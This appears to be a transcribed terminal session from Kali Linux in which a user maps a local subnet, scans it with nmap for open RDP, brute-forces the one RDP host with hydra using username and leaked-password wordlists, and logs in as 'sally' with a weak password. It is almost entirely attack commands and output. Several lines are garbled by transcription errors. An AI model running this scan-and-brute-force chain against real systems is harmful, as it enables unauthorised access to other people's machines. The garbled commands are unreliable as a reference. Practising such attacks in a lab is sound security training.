(kim®kali)-[~]
> ip a
1: lo: <LOOPBACK, UP, LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen
link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever
inet6 :: 1/128 scope host noprefixroute 1000 
2: valid_lft forever preferred_lft forever
eth@: <BROADCAST, MULTICAST, UP, LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
link/ether 00:50:00:00:01:00 brd ff:ff:ff:ff:ff:ff
inet 192.168.1.25/24 brd 192.168.1.255 scope glolal noprefixroute eth0
valid_lft forever preferred_lft forever
inet6 fe80:: e832:bad:4cad:120e/64 scope link noprefixroute
valid_lft forever preferred_lft forever


1- Kim found the subnet: 192.168.1.0/24
2- Scan entire network for rdp (port 3389)

(kim®kali)-[~]
$ nmap -p 3389 192.168.1.0/24 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-16 15:34 EDT
Nmap scan report for 192.168.1.1
Host is up (0.00085s latency).

PORT   STATE SERVICE
3389/tcp closed ms-wbt-server
MAC Address: AA:BB:CC:00:20:00 (Unknown)

Nmap scan report for 192.168.1.20
Host is up (0.00098s latency).

PORT STATE SERVICE
3389/tcp open ms-wbt-server
MAC Address: 50:00:00:05:00:00 (Unknown)

Nmap scan report for 192.168.1.25 Host is up (0.000081s latency).
STATE SERVICE 3389/tcp closed ms-wbt-serverI

Nmap done: 256 IP addresses (3 hosts up) scanned in 2.22 seconds



(kim®kali)-[~]
> hydra

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - 
Please do not use in military or secret service organizations, or for ill
egal purposes (this his is non-binding, these ** ignore laws 
and ethics anyway).

Syntax: hydra [[[-l LOGINL FILE] [-p PASSP FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] TA
SKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OP T] [service://server
                                                                                                       [:PORT][/OPT]]



(kim®kali)-[~] 
>  cd /usr/share/

-(kim@kali)-[/usr/share]
> Ls find sec*
find: 'sec*': No such file or directory

(kim®kali)-[/usr/share]
> cd wordlists/


(kim® kali)-[/usr/share/wordlists]
> ls
rockyou.txt.gz.  sqlmap.txt
wfuzz  wifite.txt.  fern-wifi
john.lst.  legion.  metasploit
nmap.lst.   amass.     dirb
dirbuster fasttrack.txt.    dnsmap.txt

-(kim®kali)-[/usr/share/wordlists


(kim@ kali)-[/usr/share/wordlists] 
> sudo apt install seclists
Installing:
seclists  


(kim® kali)-[/usr/share/wordlists/seclists]
> ls
Discovery.   Fuzzing  Miscellaneou. Passwords
Pattern-Matching. Payloads. README.md. Usernames.  Web-Shells


(kim®kali)-[/usr/share/wordlists/seclists    



(kim®kali)-[/usr/share/wordlists/seclists] 
> hydra -t 4 -V -f -L Usernames/top-usernames-shortlist.txt -P Passwords/Leaked-Databases/rockyou-05.txt rdp://192 .168.1.20 

kim@kali:

—(kim®kali)-[~]
> xfreerdp3 /u:sally /p:123456 /v:192.168.1.20
[16:23:10:919] [65316:0000ff25] [WARN] [com.freerdp.client.xfreerdp.utils] - 
[run_action _script]: [ActionScript] no such script '/home/kim/.config/freerdp/action.sh' 
[16:23:10:919] [65316:0000ff25] [WARN] [com.freerdp.client.xfreerdp.utils] - [run_action
script]: [ActionScript] no such script '/home/kim/.config/freerdp/action.sh


            
